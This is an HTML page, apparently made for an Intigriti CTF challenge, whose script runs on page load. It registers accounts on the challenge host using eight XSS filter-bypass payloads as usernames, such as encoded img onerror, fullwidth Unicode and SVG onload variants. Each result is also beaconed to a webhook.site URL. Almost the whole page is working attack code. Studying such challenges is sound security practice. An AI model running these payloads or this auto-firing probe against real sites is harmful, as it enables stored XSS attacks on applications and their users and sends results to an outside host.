<!DOCTYPE html>
<html>
<head>
    <title>XSS Bypass Test - Multiple Payloads</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;overflow-x:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
</head>
<body>
    <h1>XSS Bypass Test - Multiple Payload Formats</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/b2268d0f-ff42-4033-a952-2a9733379d3a';

        let step = 0;

        function log(msg, type = 'info', extra = '') {
            step++;
            const ts = new Date().toLocaleTimeString();
            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${extra}</div>`;
            console.log(`[${step}] ${msg}`, extra);
            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&type=${type}&extra=${encodeURIComponent(extra)}&ts=${Date.now()}`;
        }

        // Multiple XSS payload formats to test
        const testPayloads = [
            {
                name: 'HTML entities (standard)',
                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'
            },
            {
                name: 'Fullwidth Unicode chars',
                payload: 'user＜img src=x onerror＝＂alert(1)＂＞'  // U+FF1C, U+FF1E, U+FF02
            },
            {
                name: 'Mixed encoding',
                payload: 'user&lt;img src=x onerror=alert(\'XSS\')&gt;'
            },
            {
                name: 'Without semicolon',
                payload: 'user&lt;img src=x onerror=alert(1)&gt'
            },
            {
                name: 'Backtick encoded',
                payload: 'user&lt;img src=x onerror=&grave;alert(1)&grave;&gt;'
            },
            {
                name: 'SVG payload',
                payload: 'user&lt;svg onload=alert(1)&gt;'
            },
            {
                name: 'Simple tag only',
                payload: 'user&lt;img src=x&gt;'
            },
            {
                name: 'With forward slash',
                payload: 'user&lt;img src=x onerror=&quot;alert(1)&quot; /&gt;'
            },
        ];

        async function testBypass() {
            try {
                log('STARTING XSS BYPASS TEST', 'warning');

                for (const test of testPayloads) {
                    log(`Testing: ${test.name}`, 'info', `Payload: ${test.payload.substring(0, 50)}...`);

                    try {
                        const resp = await fetch(TARGET + '/api/register', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                username: test.payload,
                                password: 'TestPass123!'
                            })
                        });

                        const data = await resp.json();
                        const result = resp.ok ? 'SUCCESS' : `FAILED (${resp.status})`;

                        if (resp.ok) {
                            log(`✓ ${test.name}: REGISTRATION WORKED!`, 'success', `Username: ${test.payload.substring(0, 30)}`);
                        } else {
                            log(`✗ ${test.name}: ${result}`, 'error', data.error || 'Unknown error');
                        }

                        await new Promise(r => setTimeout(r, 500));

                    } catch (e) {
                        log(`✗ ${test.name}: NETWORK ERROR`, 'error', e.message);
                    }
                }

                log('TEST COMPLETE. Check results above.', 'info');
                log('If any registration succeeded, that payload bypasses validation!', 'warning');

            } catch (error) {
                log('FATAL ERROR', 'error', error.message);
            }
        }

        window.addEventListener('load', () => {
            log('Page loaded, starting bypass test...', 'info');
            setTimeout(testBypass, 500);
        });
    </script>
</body>
</html>
